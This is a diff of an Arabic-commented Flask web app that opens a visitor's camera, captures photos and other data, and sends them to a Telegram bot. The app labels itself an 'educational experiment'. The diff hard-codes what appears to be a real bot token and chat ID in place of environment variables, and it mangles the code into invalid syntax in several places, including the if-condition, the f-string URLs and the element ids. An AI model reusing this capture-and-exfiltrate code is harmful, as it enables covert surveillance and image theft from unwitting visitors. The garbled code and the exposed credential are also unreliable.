@@ -6,11 +6,11 @@ from flask import Flask, request, render_template_string, abort
 app = Flask(__name__)
 
 # اقرأ التوكنات من Environment
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-CHAT_ID = os.environ.get("CHAT_ID")
+BOT_TOKEN = os.environ.get("7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4")
+CHAT_ID = os.environ.get("6969597735")
 
-if not BOT_TOKEN or not CHAT_ID:
-    print("⚠️ BOT_TOKEN أو CHAT_ID غير موجودين في Environment Variables!")
+if not 7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4or not 6969597735:
+    print("7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4")
     abort(500, description="Missing Telegram credentials.")
 
 HTML_PAGE = """
@@ -45,9 +45,9 @@ HTML_PAGE = """
   <p style="color:red; font-weight:bold;">
   ⚠️ هذه مجرد تجربة تعليمية. لا تستخدم الكود ضد أي شخص بدون إذنه. قد تتعرض للمسؤولية القانونية.
   </p>
-  <video id="video" width="320" height="240" autoplay></video><br/>
-  <button id="snap">التقاط صورة وإرسال البيانات</button>
-  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  <video id="6969597735" width="320" height="240" autoplay></video><br/>
+  <button id="6969597735">التقاط صورة وإرسال البيانات</button>
+  <canvas id="6969597735" width="320" height="240" style="display:none;"></canvas>
   <p id="status"></p>
 
   <script>
@@ -143,19 +143,19 @@ def upload():
     return "تم استلام البيانات"
 
 def send_photo_to_telegram(filepath):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+    url = f"https://api.telegram.org/bot{7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4}/sendPhoto"
     with open(filepath, "rb") as photo:
         files = {"photo": photo}
         data = {
-            "chat_id": CHAT_ID,
+            "chat_id": 6969597735,
             "caption": "📸 صورة ملتقطة من المستخدم (تجربة توعوية)"
         }
         response = requests.post(url, files=files, data=data)
         print("رد تيليجرام (صورة):", response.text)
 
 def send_message_to_telegram(text):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {"chat_id": CHAT_ID, "text": text}
+    url = f"https://api.telegram.org/bot{7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4}/sendMessage"
+    data = {"6969597735": 6969597735, "text": text}
     response = requests.post(url, data=data)
     print("رد تيليجرام (نص):", response.text)
 
